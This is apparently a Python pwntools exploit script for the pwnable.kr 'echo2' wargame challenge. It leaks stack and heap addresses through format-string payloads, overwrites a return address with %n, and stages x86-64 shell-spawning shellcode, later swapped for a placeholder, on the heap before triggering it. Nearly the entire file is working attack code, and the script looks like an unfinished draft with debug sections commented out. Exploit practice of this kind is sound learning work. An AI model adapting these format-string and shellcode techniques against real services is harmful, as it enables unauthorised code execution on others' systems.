# -*- coding: utf-8 -*-
from pwn import *

remoto = False
remoto = True
if remoto:
	host = '0'
	host = 'pwnable.kr'
	conn = connect(host, 9011)
else:
	conn = process('./echo2')

nombre = 'physics'
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
obj_o = 0x602098
shellcode = 'A' + 'B' * 29 + 'C'

assert len(shellcode) < 32

def read_addr(address, text=False):
	conn.sendline('2')
	conn.recvuntil(nombre + '\n')
	payload  = '%7$s    '
	payload += p64(address)
	conn.sendline( payload )
	addr = conn.recvuntil('    ')[:-4]
	if text is False:
		addr += '\x00' * (8 - len(addr))
		addr  = u64(addr)
	conn.recvuntil('> ')
	return addr

def main():
	print ''
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get ret addr
	conn.sendline('2')
	conn.recvuntil(nombre + '\n')
	conn.sendline('%9$p')
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret_addr = leak - 216
	print 'main ret addr:' + hex(ret_addr)
	print ''
	conn.recvuntil('> ')

	# get shellcode addr
	leak = read_addr(obj_o)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 0x34
	if remoto and host == 'pwnable.kr':
		shellcode_addr += 12
	if len(hex(shellcode_addr)) > 8:
		pass
		#print 'try again'
		#conn.close()
		#return
	print 'shellcode addr:' + hex(shellcode_addr)
	print ''

	# overwrite ret addr
	conn.sendline('2')
	conn.recvuntil(nombre + '\n')
	payload  = '%7$n    '
	payload += p64(ret_addr)
	conn.sendline( payload )
	print conn.recvuntil('goodbye')[:7]
	conn.recvuntil('> ')

	adr = read_addr(ret_addr)
	print hex(adr)

	# debug
	#addr = read_addr(ret_addr)
	#print hex(addr)
	#conn.close()
	#return
	# debug

	#sh_bytes = hex(shellcode_addr)[2:]
	#b1 = (2, int(sh_bytes[0:2], 16))
	#b2 = (1, int(sh_bytes[2:4], 16))
	#b3 = (0, int(sh_bytes[4:6], 16))
	#sh_bytes = [b1, b2, b3]

	#for sh_byte in sh_bytes:
	#	pos, lenght = sh_byte
	#	if lenght < 8:
	#		print 'try again'
	#		conn.close()
	#		return
	#	else:
	#		conn.sendline('2')
	#		conn.recvuntil(nombre)
	#		print 'escribo:' + hex(lenght)
	#		extra = len(str(lenght))
	#		payload  = '%{:d}x'.format(lenght - (8 - extra))
	#		payload += ' ' * (8 - extra)
	#		payload += '%8$hhn'
	#		payload += p64(ret_addr +  pos)
	#		conn.sendline( payload )
	#		conn.recvuntil('> ')

	# place shellcode on heap
	conn.sendline('3')
	conn.recvuntil(nombre + '\n')
	conn.sendline(shellcode)
	conn.recvuntil('> ')

	# trigger shellcode
	conn.sendline('4')
	conn.sendline('y')
	conn.recvuntil('bye')
	#conn.interactive()
	conn.close()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass
